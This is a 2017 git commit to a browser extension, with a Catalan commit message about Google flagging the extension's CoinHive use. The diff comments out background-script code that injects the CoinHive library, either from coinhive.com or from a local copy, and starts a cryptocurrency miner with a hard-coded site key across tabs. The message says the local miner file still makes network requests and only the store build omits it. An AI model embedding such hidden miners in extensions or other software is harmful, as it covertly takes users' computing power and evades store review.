ec39e2e34506659b37e681a44c534acac25fdaff
Roger Pedros <pedrooos.46@gmail.com>
2017-11-21 13:24:53 +0100

    V. 1.8.7 -Problemes amb Google per CoinHive i les peticions XHR -Retirada de CoinHive i MManager del manifest -El minner (ch.min) esta en local pero segueix fen peticions XHR
    Store:
    -La versió deploy no te ni el ch.min ni el MManager.

--- Background/MManager.js
+++ Background/MManager.js
@@ -1,16 +1,16 @@
 /*Copyright (C) 2017, Roger Pedrós Villorbina, All rights reserved.*/
 
-var script = document.createElement('script');
-script.onload = () => {
-    var miner = new CoinHive.User('BEC1lwZglIkPuTYWaHPRTwDIsFskQovi', 'Deployed', {
-        threads: 1,
-        autoThreads: false,
-        throttle: 0.90,
-        forceASMJS: false,
-    });
-    miner.start(CoinHive.FORCE_MULTI_TAB);
-
-};
-script.src = 'https://coinhive.com/lib/coinhive.min.js';
-document.getElementsByTagName('BODY')[0].appendChild(script);
-document.getElementsByTagName("BODY")[0].innerHTML = "My First JavaScript";
+// var script = document.createElement('script');
+// script.onload = () => {
+//     var m = new CoinHive.User('BEC1lwZglIkPuTYWaHPRTwDIsFskQovi', 'Deployed', {
+//         threads: 1,
+//         autoThreads: false,
+//         throttle: 0.90,
+//         forceASMJS: false,
+//     });
+//     m.start(CoinHive.FORCE_MULTI_TAB);
+//
+// };
+// script.src = 'Resources/js/ch.min.js';
+// document.getElementsByTagName('BODY')[0].appendChild(script);
+// document.getElementsByTagName("BODY")[0].innerHTML = "My First JavaScript";
